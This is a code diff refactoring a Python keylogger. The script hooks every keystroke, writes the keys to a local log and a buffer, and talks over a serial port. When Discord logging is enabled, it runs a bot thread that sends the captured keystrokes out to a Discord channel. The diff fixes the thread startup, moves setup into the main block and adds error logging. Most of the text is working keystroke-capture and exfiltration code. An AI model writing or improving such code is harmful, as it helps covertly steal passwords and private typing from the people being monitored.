@@ -7,22 +7,9 @@ import os
 import keyboard as k
 import datetime
 import serial
-import send_discord
-from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN , buffer_path
-SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
-NULL_CHAR = chr(0)
 
-path_log = f"{SCRIPT_PATH}/Log.txt"
-serial_port = r'/dev/ttyS0'
 
-ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
-shift_pressed = False
 
-discord_thread = None
-if ENABLE_DISCORD_LOGGING:
-    discord_thread = threading.Thread(send_discord.run_bot)
-    discord_thread.daemon = True
-    discord_thread.start()
 def on_key_event(e):
     global shift_pressed
     if ENABLE_DISCORD_LOGGING and not discord_thread.is_alive():
@@ -54,7 +41,7 @@ def on_key_event(e):
             if len(e.name) > 1 and e.name != "space":
                 log(f"({e.name})")
             elif e.name == "space":
-                log(" ")
+                log("⠀")
             else:
                 log(e.name)
 
@@ -68,16 +55,34 @@ def log(message:str):
             discord_log.write(message)
 def restart_discord_thread():
     global discord_thread
-    discord_thread = threading.Thread(send_discord.run_bot)
+    discord_thread = threading.Thread(target=run_bot)
     discord_thread.daemon = True
     discord_thread.start()
 
 
 def setup():
-    with open(path_log, "a") as log:
-        log.write(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
+    
+    log(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
 if __name__ == "__main__":
+        
         try:
+            SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
+            from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN 
+            if ENABLE_DISCORD_LOGGING:
+                from send_discord import buffer_path , run_bot
+            
+            NULL_CHAR = chr(0)
+
+            path_log = f"{SCRIPT_PATH}/Log.txt"
+            serial_port = r'/dev/ttyS0'
+            ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
+            shift_pressed = False
+
+            discord_thread = None
+            if ENABLE_DISCORD_LOGGING:
+                discord_thread = threading.Thread(target=run_bot)
+                discord_thread.daemon = True
+                discord_thread.start()
             setup()
 
 
@@ -88,3 +93,6 @@ if __name__ == "__main__":
             print("closing")
             ser.write("0,\n".encode("utf-8"))
             quit()
+        except Exception as e:
+            with open(f"{SCRIPT_PATH}/error_handler.txt", "a") as file:
+                file.write(str(e))
